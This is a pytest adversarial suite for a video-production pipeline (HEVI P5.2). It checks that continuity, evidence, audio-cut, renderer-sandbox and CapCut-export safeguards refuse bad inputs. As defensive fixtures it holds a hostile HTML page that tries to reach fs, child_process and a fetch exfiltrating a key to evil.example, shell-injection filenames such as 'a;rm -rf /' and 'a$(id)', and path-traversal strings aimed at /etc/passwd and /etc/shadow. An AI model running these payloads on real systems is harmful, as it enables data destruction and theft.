"""HEVI P5.2 — adversarial suite (A1-A24) plus security probes.

Each case is a way P5.2 could quietly lie, cheat, exfiltrate or do damage. Every
test asserts the system *refuses*.

    A1  duplicate entity names create duplicate identity -> BLOCK
    A2  character asset changes without revision          -> continuity FAIL
    A3  product logo guessed by the model                -> BLOCK
    A4  shot generation while UNPREPARED                 -> BLOCK
    A5  missing evidence but READY                       -> BLOCK
    A6  random transition added for variety              -> FAIL
    A7  intentional motif flagged despite justification  -> preserve
    A8  presenter audio hash mismatch                    -> BLOCK
    A9  presenter truncates narration                   -> BLOCK
    A10 all presenter shots forced FULL                 -> policy FAIL
    A11 intentional emotional pause removed as silence   -> FAIL
    A12 cut truncates a word                             -> BLOCK
    A13 cut introduces an audio click                    -> BLOCK
    A14 fake product UI marked real                     -> BLOCK
    A15 product claim not represented by UI evidence     -> BLOCK
    A16 product repo modified without authorisation      -> BLOCK
    A17 HTML renderer accesses a host secret             -> BLOCK
    A18 HTML renderer escapes the sandbox                -> BLOCK
    A19 renderer silently changes duration               -> BLOCK
    A20 CapCut malicious filename shell injection        -> BLOCK
    A21 CapCut path traversal                           -> BLOCK
    A22 broken material reference                       -> delivery BLOCK
    A23 flattened media marked native editable           -> BLOCK
    A24 Pocket TTS unsupported Chinese silently accepted -> BLOCK
"""

from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path

import pytest

from hevi.editable import (
    EditableBackendId,
    EditableProjectManifest,
    ProjectOutcome,
    TrackElement,
    lint_manifest,
    project_manifest,
    register_all_backends,
)
from hevi.editable.capcut_cli import CapCutSecurityError, assert_contained, assert_safe_name
from hevi.ops.p5_1_types import EvidenceAsset, EvidenceSourceType
from hevi.production.creative_ledger import CreativeLedger, fingerprint_from_shot
from hevi.production.entities import (
    ProductionEntityGraph,
    audit_continuity,
    person_entity,
    product_entity,
)
from hevi.production.presenter import (
    AudioLock,
    PresenterArtifact,
    PresenterScale,
    PresenterShotRange,
    build_presenter_plan,
    check_presenter_qa,
    validate_presentation_mix,
)
from hevi.production.product_video import (
    ProductDemoState,
    ProductEvidenceTier,
    ProductRepoMutationError,
    ProductSurface,
    ProductSurfaceManifest,
    assert_not_fake_product_ui,
    assert_repo_read_only,
    build_product_video_plan,
    ground_claim,
)
from hevi.production.raw_footage import (
    CutBoundaryIssue,
    CutPlan,
    RawFootageSource,
    SilenceClass,
    Transcript,
    TranscriptSegment,
    TranscriptWord,
    build_cut_plan,
    check_cut_boundaries,
    detect_audio_clicks,
    detect_silences,
    detect_takes,
    execute_fine_cut,
)
from hevi.production.shot_readiness import (
    ShotPreparation,
    ShotReadinessError,
    ShotState,
    assert_ready_for_generation,
    evaluate_readiness,
)
from hevi.providers.pocket_tts import (
    PocketTtsLanguageError,
    TtsRequest,
    probe,
    synthesise,
)
from hevi.renderers import (
    FfmpegRenderer,
    HtmlGsapRenderer,
    RenderContractViolation,
    RenderPlan,
    RenderResult,
    enforce_equivalence,
)
from hevi.renderers.html_gsap import (
    assert_no_unsafe_url,
    assert_sandbox_path,
    scrubbed_environment,
)

# ── A1 ───────────────────────────────────────────────────────────────────


def test_a1_duplicate_entity_names_do_not_create_duplicate_identity() -> None:
    graph = ProductionEntityGraph("p")
    graph.register(person_entity("Ada Lovelace", face_ref="a.png"))
    graph.register(person_entity("Ada  lovelace", face_ref="b.png"))
    graph.register(product_entity("Acme Console"))
    graph.register(product_entity("acme console."))
    assert graph.count() == 2
    assert audit_continuity(graph).ok is True


# ── A2 ───────────────────────────────────────────────────────────────────


def test_a2_character_asset_changing_without_revision_fails_continuity() -> None:
    graph = ProductionEntityGraph("p")
    person, _ = graph.register(person_entity("Ada", face_ref="a.png", clothing_ref="navy.png"))
    report = audit_continuity(
        graph,
        declared_states={
            person.entity_id: {
                "face_reference": {"shot_1": "a.png", "shot_2": "b.png"},
            }
        },
    )
    assert report.ok is False
    assert report.gates["CHARACTER_CONTINUITY"] is False


# ── A3 ───────────────────────────────────────────────────────────────────


def test_a3_product_logo_guessed_by_the_model_is_blocked() -> None:
    graph = ProductionEntityGraph("p")
    guessed = product_entity("Acme", logo_ref="invented-logo.png")
    assert guessed.visual_constraints[0].verified is False
    graph.register(guessed)
    report = audit_continuity(graph)
    assert report.ok is False
    assert any("UNVERIFIED_BRAND_TOKEN" in v for v in report.violations)


# ── A4 ───────────────────────────────────────────────────────────────────


@pytest.mark.parametrize("state", list(ShotState))
def test_a4_generation_while_unprepared_is_blocked(state: ShotState) -> None:
    if state is ShotState.READY:
        return
    with pytest.raises(ShotReadinessError):
        assert_ready_for_generation(ShotPreparation(shot_id="s", state=state))


# ── A5 ───────────────────────────────────────────────────────────────────


def test_a5_missing_evidence_cannot_report_ready() -> None:
    prep = ShotPreparation(
        shot_id="s", beat_id="b", evidence_required=True,
        audio_range=(0, 2), presentation_role="EVIDENCE_DOMINANT", renderer="remotion",
    )
    report = evaluate_readiness(prep, available_assets=set())
    assert report.ready is False
    assert report.state is ShotState.BLOCKED


def test_a5_declared_but_missing_evidence_cannot_report_ready() -> None:
    prep = ShotPreparation(
        shot_id="s", beat_id="b", evidence_required=True,
        required_asset_refs=["evidence/shot1.png"],
        audio_range=(0, 2), presentation_role="EVIDENCE_DOMINANT", renderer="remotion",
    )
    report = evaluate_readiness(prep, available_assets=set())
    assert report.ready is False


# ── A6 / A7 ──────────────────────────────────────────────────────────────


def _uniform_ledger(repeat_limit: int = 2) -> CreativeLedger:
    ledger = CreativeLedger(repeat_limit=repeat_limit)
    for index in range(6):
        ledger.record(
            fingerprint_from_shot(
                f"s{index}", "v1",
                layout="split_left", transition="hard_cut", motion="push_in",
                camera="locked", accent="teal", theme="dark", duration_s=4.0,
                entrance="rise", exit="fade",
            )
        )
    return ledger


def test_a6_variety_cannot_be_manufactured_by_repetition_or_randomness() -> None:
    """A cut that repeats everything is a finding, not a variety strategy."""
    ledger = _uniform_ledger()
    audit = ledger.audit(video_id="v1")
    assert audit.ok is False
    assert len(audit.findings) >= 5


def test_a7_justified_motif_is_preserved_not_flagged() -> None:
    ledger = _uniform_ledger()
    for key in (
        "TRANSITION:hard_cut", "LAYOUT:split_left", "CAMERA:locked",
        "ACCENT:teal", "THEME:dark", "DURATION:uniform",
        "MOTION:push_in", "ENTRANCE:rise", "EXIT:fade",
    ):
        ledger.justify("family", key, "brand system and tutorial continuity")
    audit = ledger.audit(video_id="v1")
    assert audit.ok is True
    assert all(f.justified for f in audit.findings)


# ── A8 / A9 / A10 ───────────────────────────────────────────────────────


def test_a8_presenter_audio_hash_mismatch_is_blocked(tmp_path: Path) -> None:
    audio = tmp_path / "a.wav"
    audio.write_bytes(b"narration")
    lock = AudioLock("al", str(audio), "sha256:expected", 1.0)
    plan = build_presenter_plan(plan_id="p", presenter_entity_id="e", audio_lock=lock)
    artifact = PresenterArtifact("pr", "e", "prov", audio_hash="sha256:different",
                                 duration_s=1.0, lip_sync_metadata={"ok": True})
    report = check_presenter_qa(artifact, plan, audio_duration_s=1.0)
    assert report.ok is False
    assert any(i.kind == "PRESENTER_AUDIO_HASH_MISMATCH" for i in report.issues)


def test_a9_presenter_truncating_narration_is_blocked() -> None:
    lock = AudioLock("al", "/tmp/a.wav", "sha256:h", 10.0)
    plan = build_presenter_plan(plan_id="p", presenter_entity_id="e", audio_lock=lock)
    artifact = PresenterArtifact("pr", "e", "prov", audio_hash="sha256:h",
                                 duration_s=4.0, lip_sync_metadata={"ok": True})
    report = check_presenter_qa(artifact, plan, audio_duration_s=10.0)
    assert any(i.kind == "PRESENTER_TRUNCATES_NARRATION" for i in report.issues)


def test_a10_all_presenter_shots_forced_full_is_a_policy_failure() -> None:
    ranges = [
        PresenterShotRange(f"s{i}", float(i), i + 1.0, scale=PresenterScale.FULL)
        for i in range(5)
    ]
    ok, violations = validate_presentation_mix(ranges)
    assert ok is False
    assert "PRESENTER_FULL_SCREEN_EVERYWHERE" in violations


# ── A11 ──────────────────────────────────────────────────────────────────


def test_a11_intentional_emotional_pause_is_not_removed() -> None:
    transcript = Transcript(segments=[
        TranscriptSegment(0, "我第一次读它，只觉得句子漂亮。", 0.0, 3.0),
        TranscriptSegment(1, "后来才明白它在说什么。", 4.2, 6.0),
    ])
    silences = detect_silences(transcript, total_duration_s=6.2)
    beat = next(s for s in silences if abs(s.start_s - 3.0) < 0.05)
    assert beat.classification is SilenceClass.INTENTIONAL_PAUSE
    plan = build_cut_plan(
        RawFootageSource("s", "/x"), transcript, detect_takes(transcript), silences
    )
    removed = [tuple(r) for r in plan.removed_ranges]
    assert (3.0, 4.2) not in removed


# ── A12 / A13 ────────────────────────────────────────────────────────────


def test_a12_cut_inside_a_word_is_blocked() -> None:
    transcript = Transcript(segments=[
        TranscriptSegment(0, "测试", 0.0, 1.0, words=[TranscriptWord("测试", 0.2, 0.8)])
    ])
    plan = build_cut_plan(
        RawFootageSource("s", "/x"), transcript,
        detect_takes(transcript), detect_silences(transcript, total_duration_s=1.0),
    )
    plan.entries[0].source_start_s = 0.5
    kinds = {i.kind for i in check_cut_boundaries(plan, transcript)}
    assert "WORD_TRUNCATION" in kinds


def test_a13_audio_click_at_a_cut_is_detected(tmp_path: Path) -> None:
    """Whether a join clicks is a property of the phase it lands on, not of the cut.

    The check has to run on the rendered file: a cut inside a continuous source
    cannot create a click by itself, and the analysis resampler shifts phase, so
    a source-side comparison reports on the codec rather than on the edit. The
    source is PCM-in-MOV because that is what a camera actually records -- seeking
    an AAC file is not phase-coherent, so splicing one gives an edit that is not
    the edit that was planned.
    """
    video = tmp_path / "take.mov"
    subprocess.run(
        ["ffmpeg", "-hide_banner", "-loglevel", "error", "-y",
         "-f", "lavfi", "-i", "color=c=navy:s=160x120:r=25:d=2",
         "-f", "lavfi", "-i", "sine=frequency=440:duration=2",
         "-c:v", "qtrle", "-c:a", "pcm_s16le", "-shortest", str(video)],
        check=True, capture_output=True,
    )
    source = RawFootageSource("take-01", str(video))
    transcript = Transcript(segments=[
        TranscriptSegment(0, "第一句在这里。", 0.0, 0.5),
        TranscriptSegment(1, "第二句从这里开始。", 0.75, 1.5),
    ])

    def render(name: str, second_start: float) -> tuple[CutPlan, list[CutBoundaryIssue]]:
        plan = build_cut_plan(
            source, transcript, detect_takes(transcript), [], remove_dead_air=False,
        )
        plan.entries[1].source_start_s = second_start
        plan.entries[1].source_end_s = second_start + plan.entries[1].duration_s
        return plan, detect_audio_clicks(plan, execute_fine_cut(source, plan, tmp_path / name))

    # A join landing on a zero crossing of a 440Hz tone is seamless; the same
    # join landing a quarter-cycle later is a full-amplitude step.
    seamless = 0.5
    _, quiet = render("seamless", seamless)
    _, clicked = render("clicked", seamless + 0.25 / 440)

    assert [i.kind for i in quiet] == [], [i.detail for i in quiet]
    assert "AUDIO_CLICK" in {i.kind for i in clicked}, [i.detail for i in clicked]


# ── A14 / A15 / A16 ──────────────────────────────────────────────────────


def _product_manifest() -> ProductSurfaceManifest:
    return ProductSurfaceManifest(
        product_id="acme", repository_revision="r1",
        routes=[ProductSurface("/dashboard", renderable=True)],
        states=[ProductDemoState("dash", "loaded", "/dashboard", reachable=True,
                                 captured_asset_id="ev1")],
    )


def test_a14_fake_product_ui_marked_real_is_blocked() -> None:
    fake = EvidenceAsset(
        asset_id="ev", source_type=EvidenceSourceType.GENERATED_VISUALIZATION,
        claim_supported="Acme Console", entity="acme",
        captured_at="2026-09-01T00:00:00Z", source_uri="https://acme.dev/dashboard",
        provenance={"generator": "sdxl", "generated": True},
    )
    ok, violations = assert_not_fake_product_ui(fake, ProductEvidenceTier.REAL_RUNNING_UI)
    assert ok is False
    assert any("FAKE_PRODUCT_UI_AS_REAL" in v for v in violations)


def test_a15_capability_claim_without_ui_evidence_is_blocked() -> None:
    plan = build_product_video_plan(
        plan_id="p", manifest=_product_manifest(), claims=["这个产品支持批量导出。"]
    )
    grounding = ground_claim(claim="这个产品支持批量导出。", plan=plan, shot_id="s1")
    assert grounding.grounded is False
    assert grounding.reason == "NO_EVIDENCE_ASSET"


def test_a15_capability_claim_on_symbolic_evidence_is_blocked() -> None:
    plan = build_product_video_plan(
        plan_id="p", manifest=_product_manifest(), claims=["这个产品支持批量导出。"]
    )
    symbolic = EvidenceAsset(
        asset_id="ev", source_type=EvidenceSourceType.SYMBOLIC,
        claim_supported="Acme Console", entity="acme",
        captured_at="2026-09-01T00:00:00Z", source_uri="https://acme.dev/dashboard",
        provenance={"generated": True, "labelled_as_generated": True},
    )
    grounding = ground_claim(claim="这个产品支持批量导出。", plan=plan, evidence=symbolic)
    assert grounding.grounded is False


def test_a16_product_repo_mutation_is_blocked() -> None:
    with pytest.raises(ProductRepoMutationError):
        assert_repo_read_only(_product_manifest(), before={"a"}, after={"a", "b"})
    with pytest.raises(ProductRepoMutationError):
        assert_repo_read_only(
            ProductSurfaceManifest(product_id="x", read_only=False),
            before={"a"}, after={"a"},
        )


# ── A17 / A18 ────────────────────────────────────────────────────────────


def test_a17_html_renderer_cannot_read_a_host_secret(monkeypatch) -> None:
    monkeypatch.setenv("FAL_API_KEY", "super-secret-value")
    monkeypatch.setenv("HEVI_ANOTHER_SECRET", "also-secret")
    env = scrubbed_environment()
    assert "FAL_API_KEY" not in env
    assert "HEVI_ANOTHER_SECRET" not in env


@pytest.mark.slow
def test_a17_hostile_page_cannot_reach_fs_shell_or_network() -> None:
    """Drive a hostile page through a real browser under the render environment."""
    if not HtmlGsapRenderer().detect():
        pytest.skip("HTML backend unavailable")
    from hevi.renderers.html_gsap import _resolve_playwright_module

    driver = _resolve_playwright_module()
    if not driver:
        pytest.skip("no node playwright driver")
    import tempfile

    workdir = Path(tempfile.mkdtemp(prefix="a17_"))
    page = workdir / "evil.html"
    page.write_text(
        "<!doctype html><html><body><script>"
        "const o={fs:[],cp:[],env:[]},d=new URLSearchParams(location.search);"
        "const setTitle=()=>{document.title=JSON.stringify(o);};"
        "try{const r=require('fs');o.fs.push('fs-ok');}catch(e){o.fs.push('fs-blocked');}"
        "try{const r=require('child_process');o.cp.push('cp-ok');}catch(e){o.cp.push('cp-blocked');}"
        "try{o.env.push('env:'+(typeof process==='undefined'?'no-process':'process-leaked'));}"
        "catch(e){o.env.push('env-error');}"
        "try{o.env.push('key:'+(d.get('key')||'none'));}catch(e){}"
        "const hung=new Promise(function(resolve){setTimeout(function(){o.env.push("
        "'fetch-hung');resolve();},1500);});"
        "const req=fetch('https://evil.example/exfil?k='+(d.get('key')||''))"
        ".then(function(){o.env.push('fetch-ok');})"
        ".catch(function(){o.env.push('fetch-blocked');});"
        "Promise.race([req,hung]).then(function(){setTitle();});"
        "setTitle();"
        "</script></body></html>",
        encoding="utf-8",
    )
    env = {
        "PATH": os.environ.get("PATH", ""),
        "HOME": str(workdir),
        "NODE_PATH": driver,
        "PLAYWRIGHT_BROWSERS_PATH": os.path.expanduser("~/.cache/ms-playwright"),
    }
    result = subprocess.run(
        ["node", "-e", f"""
const {{chromium}}=require('playwright-core');
(async()=>{{
  const blocked=[];
  const b=await chromium.launch({{args:['--no-sandbox']}});
  const c=await b.newContext({{offline:true,viewport:{{width:320,height:180}}}});
  await c.route('**/*',r=>{{const u=r.request().url();
    if(u.startsWith('file://')||u.startsWith('data:')||u.startsWith('about:')) return r.continue();
    blocked.push(u); return r.abort();}});
  const p=await c.newPage();
  await p.goto('{(page.as_uri())}?key=SECRET',{{waitUntil:'load'}});
  await p.waitForTimeout(1200);
  console.log(JSON.stringify({{title:await p.title(),blocked:blocked}}));
  await b.close();
}})();
"""],
        capture_output=True, text=True, timeout=180, check=False,
        env=env, cwd=str(workdir),
    )
    lines = [line for line in result.stdout.strip().splitlines() if line.strip()]
    assert lines, f"probe produced no output: {result.stderr[-400:]}"
    payload = json.loads(lines[-1])
    title = payload["title"]
    assert "fs-blocked" in title
    assert "cp-blocked" in title
    assert "no-process" in title
    # Either the request was blocked outright or it never resolved. What must
    # not happen is a completed request, and the route log independently proves
    # the URL never got a response.
    assert "fetch-ok" not in title, title
    assert {"fetch-blocked", "fetch-hung"} & set(json.loads(title)["env"]), title
    assert any("evil.example" in url for url in payload["blocked"])


def test_a18_html_renderer_cannot_escape_the_sandbox(tmp_path: Path) -> None:
    root = tmp_path / "sandbox"
    root.mkdir()
    for escape in ("/etc/passwd", "../../etc/passwd", str(tmp_path / ".." / "secret")):
        with pytest.raises(PermissionError, match="PATH_ESCAPE"):
            assert_sandbox_path(Path(escape), root)
    assert assert_sandbox_path(root / "page.html", root) == (root / "page.html").resolve()


def test_a18_non_data_url_schemes_are_refused() -> None:
    for url in ("file:///etc/passwd", "https://a/b", "http://a/b", "ftp://a/b"):
        with pytest.raises(PermissionError):
            assert_no_unsafe_url(url)


# ── A19 ──────────────────────────────────────────────────────────────────


def test_a19_renderer_silently_changing_duration_is_blocked() -> None:
    plan = RenderPlan(shot_id="s", duration_s=3.0, fps=30, semantic_intent="explain")
    with pytest.raises(RenderContractViolation) as excinfo:
        enforce_equivalence(plan, RenderResult(shot_id="s", renderer="X", duration_s=7.0))
    assert any("DURATION_CHANGED" in v for v in excinfo.value.violations)


def test_a19_renderer_dropping_evidence_is_blocked() -> None:
    plan = RenderPlan(
        shot_id="s", duration_s=2.0, fps=30, required_evidence=["ev.png"],
        extra={"evidence_present": False},
    )
    with pytest.raises(RenderContractViolation):
        enforce_equivalence(plan, RenderResult(shot_id="s", renderer="X", duration_s=2.0))


def test_a19_ffmpeg_refuses_semantic_motion() -> None:
    result = FfmpegRenderer().render(
        RenderPlan(shot_id="s", duration_s=2.0, motion_purposes=["COMPARE_STATE"]),
        Path("/tmp/opencode/a19"),
    )
    assert result.outcome.value == "REJECTED"


# ── A20 / A21 ────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "name",
    [
        "a;rm -rf /", "a && rm -rf /", "a | tee /etc/passwd", "a`whoami`",
        "a$(id)", "../../etc/passwd", "~/secrets", "a\nb", "a\x00b", "", "x" * 400,
        "a<redirect", "a>out",
    ],
)
def test_a20_capcut_malicious_filename_is_blocked(name: str) -> None:
    with pytest.raises(CapCutSecurityError):
        assert_safe_name(name)


def test_a20_capcut_rejects_a_hostile_project_name_before_invoking(tmp_path: Path) -> None:
    from hevi.editable.capcut_cli import CapCutCliBackend

    backend = CapCutCliBackend()
    if not backend.detect():
        pytest.skip("capcut-cli not installed")
    video = tmp_path / "bg.mp4"
    subprocess.run(
        ["ffmpeg", "-hide_banner", "-loglevel", "error", "-y",
         "-f", "lavfi", "-i", "color=c=teal:s=64x64:d=1",
         "-c:v", "libx264", "-pix_fmt", "yuv420p", str(video)],
        check=True, capture_output=True,
    )
    manifest = EditableProjectManifest(
        project_id="p; rm -rf /",
        duration_ms=1000,
        elements=[TrackElement("bg", "BACKGROUND", "CONTEXTUAL_BROLL", 0, 1000, str(video))],
    )
    projection = backend.project(manifest, tmp_path / "out")
    assert projection.outcome is ProjectOutcome.FAILED
    assert "UNSAFE_FILENAME" in projection.reason


def test_a21_capcut_path_traversal_is_blocked(tmp_path: Path) -> None:
    with pytest.raises(CapCutSecurityError, match="PATH_ESCAPE"):
        assert_contained(Path("/etc/shadow"), tmp_path)
    with pytest.raises(CapCutSecurityError, match="PATH_ESCAPE"):
        assert_contained(tmp_path / ".." / "outside.json", tmp_path)


# ── A22 / A23 ────────────────────────────────────────────────────────────


def test_a22_broken_material_reference_blocks_delivery(tmp_path: Path) -> None:
    register_all_backends(force=True)
    video = tmp_path / "bg.mp4"
    subprocess.run(
        ["ffmpeg", "-hide_banner", "-loglevel", "error", "-y",
         "-f", "lavfi", "-i", "color=c=teal:s=64x64:d=1",
         "-c:v", "libx264", "-pix_fmt", "yuv420p", str(video)],
        check=True, capture_output=True,
    )
    manifest = EditableProjectManifest(
        project_id="a22 demo", duration_ms=1000,
        elements=[
            TrackElement("ok", "BACKGROUND", "CONTEXTUAL_BROLL", 0, 1000, str(video)),
            TrackElement("broken", "EVIDENCE", "EVIDENCE_DOMINANT", 0, 1000,
                         "/definitely/missing.png"),
        ],
    )
    assert any(
        "MISSING_MATERIAL_FILE" in e for e in lint_manifest(manifest, project_root=tmp_path)
    )
    projection = project_manifest(
        manifest, tmp_path / "a22", EditableBackendId.INTERNAL_JIANYING
    )
    assert projection.outcome is ProjectOutcome.LINT_FAILED


def test_a23_flattened_media_marked_native_editable_is_blocked() -> None:
    """The manifest must not claim more editability than the media allows."""
    from hevi.editable.capcut_cli import classify_editability

    baked = TrackElement("cap", "CAPTIONS", "CAPTION", 0, 1000, "/baked.mp4")
    assert classify_editability(baked).value == "FLATTENED_MEDIA"
    # A manifest that *lies* about it is corrected by classification, not trusted.
    baked.editability = None  # type: ignore[assignment]
    assert classify_editability(baked).value == "FLATTENED_MEDIA"


# ── A24 ──────────────────────────────────────────────────────────────────


def test_a24_pocket_tts_unsupported_chinese_is_never_silently_accepted() -> None:
    capability = probe()
    with pytest.raises(PocketTtsLanguageError):
        synthesise(
            TtsRequest(text="你好", language="zh-CN", output_path="/tmp/x.wav"), capability
        )
    with pytest.raises(PocketTtsLanguageError):
        synthesise(
            TtsRequest(text="你好", language="zh", output_path="/tmp/x.wav"), capability
        )


# ══ Additional security probes (§96) ═══════════════════════════════════


def test_secret_scan_finds_credentials_in_shipped_sources() -> None:
    """No P5.2 module may hardcode a credential."""
    root = Path(__file__).resolve().parents[1]
    targets = [
        *sorted((root / "hevi" / "production").glob("*entity*.py")),
        *sorted((root / "hevi" / "production").glob("*creative_ledger*.py")),
        *sorted((root / "hevi" / "production").glob("*raw_footage*.py")),
        *sorted((root / "hevi" / "production").glob("*product_video*.py")),
        *sorted((root / "hevi" / "renderers").glob("*.py")),
        *sorted((root / "hevi" / "editable").glob("*.py")),
        root / "hevi" / "providers" / "pocket_tts.py",
    ]
    markers = ("sk-", "FAL_API_KEY=", "OPENAI_API_KEY=", "JWT_SECRET=", "AKIA")
    for path in targets:
        text = path.read_text(encoding="utf-8")
        for marker in markers:
            assert marker not in text, f"{path.name} contains {marker}"


def test_command_injection_test_proves_no_shell_usage() -> None:
    for module in ("hevi.editable.capcut_cli", "hevi.renderers.html_gsap",
                   "hevi.production.raw_footage"):
        source = Path(importlib_path(module)).read_text(encoding="utf-8")
        assert "shell=True" not in source, module
        assert "os.system(" not in source, module
        assert "subprocess.getoutput" not in source, module


def importlib_path(module: str) -> str:
    import importlib

    return str(importlib.import_module(module).__file__)


def test_path_traversal_test_covers_every_filesystem_writer() -> None:
    for module in ("hevi.editable.capcut_cli", "hevi.renderers.html_gsap",
                   "hevi.production.raw_footage"):
        source = Path(importlib_path(module)).read_text(encoding="utf-8")
        assert "assert_contained" in source or "mkdtemp" in source, module


def test_temp_file_scan_confirms_scratch_is_removed() -> None:
    """A failed projection must not leave project content in a temp directory."""
    import tempfile

    from hevi.editable.capcut_cli import CapCutCliBackend

    before = set(Path(tempfile.gettempdir()).glob("capcut_cli_*"))
    backend = CapCutCliBackend()
    if not backend.detect():
        pytest.skip("capcut-cli not installed")
    with tempfile.TemporaryDirectory() as workdir:
        root = Path(workdir)
        video = root / "bg.mp4"
        subprocess.run(
            ["ffmpeg", "-hide_banner", "-loglevel", "error", "-y",
             "-f", "lavfi", "-i", "color=c=teal:s=64x64:d=1",
             "-c:v", "libx264", "-pix_fmt", "yuv420p", str(video)],
            check=True, capture_output=True,
        )
        manifest = EditableProjectManifest(
            project_id="temp demo", duration_ms=1000,
            elements=[TrackElement("bg", "BACKGROUND", "CONTEXTUAL_BROLL", 0, 1000, str(video))],
        )
        backend.project(manifest, root / "out")
    after = set(Path(tempfile.gettempdir()).glob("capcut_cli_*"))
    assert after <= before, f"scratch left behind: {after - before}"


def test_untrusted_html_test_rejects_remote_content() -> None:
    """An untrusted page cannot smuggle a remote resource into a render."""
    for url in ("https://cdn.example/x.js", "//evil.example/x.js", "http://a/b.css"):
        with pytest.raises(PermissionError):
            assert_no_unsafe_url(url)


# ── A failed render says why ─────────────────────────────────────────────


def test_a_failed_capture_names_the_attempt_count_and_cause(tmp_path: Path) -> None:
    """A render that fails must be diagnosable, not just red.

    An empty ``CAPTURE_FAILED:`` is how a browser launch race gets mistaken for a
    content bug and then debugged in the wrong place for an afternoon. The reason
    has to carry the exit status, the frame count, how many attempts were made,
    and whatever the capture process actually printed.
    """
    from hevi.renderers.base import RenderOutcome, RenderPlan
    from hevi.renderers.html_gsap import HtmlGsapRenderer

    backend = HtmlGsapRenderer()
    if not backend.detect():
        pytest.skip(f"html/gsap renderer unavailable: {backend.unavailable_reason}")

    from hevi.renderers import html_gsap

    plan = RenderPlan(shot_id="a26", duration_s=0.4, fps=12, caption_text="x")
    assert "_CAPTURE_JS" in Path(html_gsap.__file__).read_text(encoding="utf-8")

    # With node unreachable the capture cannot run at all, which is the honest way
    # to reach the failure path without faking a result.
    with pytest.MonkeyPatch.context() as mp:
        mp.setenv("PATH", "")
        result = backend.render(plan, tmp_path / "fail")
    if result.outcome is RenderOutcome.OK:
        pytest.skip("node was still reachable despite the scrubbed PATH")
    reason = result.reason
    # Either the capture could not be launched, or it ran and failed. Both have to
    # be readable: a bare exception from deep inside a render tells the reader
    # nothing about which of the two happened or what to do about it.
    assert reason.startswith(("CAPTURE_UNRUNNABLE:", "CAPTURE_FAILED:")), reason
    if reason.startswith("CAPTURE_UNRUNNABLE:"):
        assert "FileNotFoundError" in reason, reason
    else:
        assert "attempts=" in reason, reason
        assert "frames=" in reason, reason
        assert "exit=" in reason, reason
    assert result.attempts >= 1
